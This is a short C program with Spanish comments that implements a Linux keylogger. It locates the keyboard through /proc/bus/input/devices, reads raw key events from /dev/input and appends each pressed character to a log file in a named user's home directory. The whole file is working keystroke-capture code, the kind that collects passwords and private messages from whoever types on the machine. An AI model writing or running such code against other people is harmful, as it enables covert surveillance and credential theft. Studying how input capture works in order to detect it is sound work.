#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"

// Mapeo básico de códigos de teclas a caracteres (para teclado QWERTY en inglés)
char keymap[128] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0, 0,
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 0, 'a',
    's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\', 'z', 'x',
    'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

char *getEvent();

int main() {
    struct input_event ev;
    // Ruta al directorio de inputs
    static char path_keyboard[20] = "/dev/input/";
    // Concatenar variable keyboard
    strcat(path_keyboard, getEvent());
    // Eliminar último carácter (breakline)
    path_keyboard[strlen(path_keyboard)-1] = 0;
    // Leer ruta a input
    int device_keyboard = open(path_keyboard, O_RDONLY);
    // Imprimir error
    if (errno > 0) {
        printf("Error: %d\n", errno);
    }
    // Abrir fichero de logs
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        printf("No se pudo abrir el archivo de log.\n");
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) { // Cuando la tecla se libera
            if (ev.code < 128 && keymap[ev.code] != 0) { // Asegurarse de que el código sea válido
                char key = keymap[ev.code];
                printf("%c\n", key); // Imprimir la tecla en consola
                fputc(key, fp); // Escribir la tecla en el archivo de log
                fflush(fp); // Asegurarse de que se escriba en el archivo inmediatamente
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    // Leer el fichero devices y extraer el input que se refiera al teclado
    char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    // Obtener la cadena de texto del evento correspondiente al teclado
    fgets(event, 8, pipe);
    pclose(pipe);
    // Retornar el evento
    return event;
}
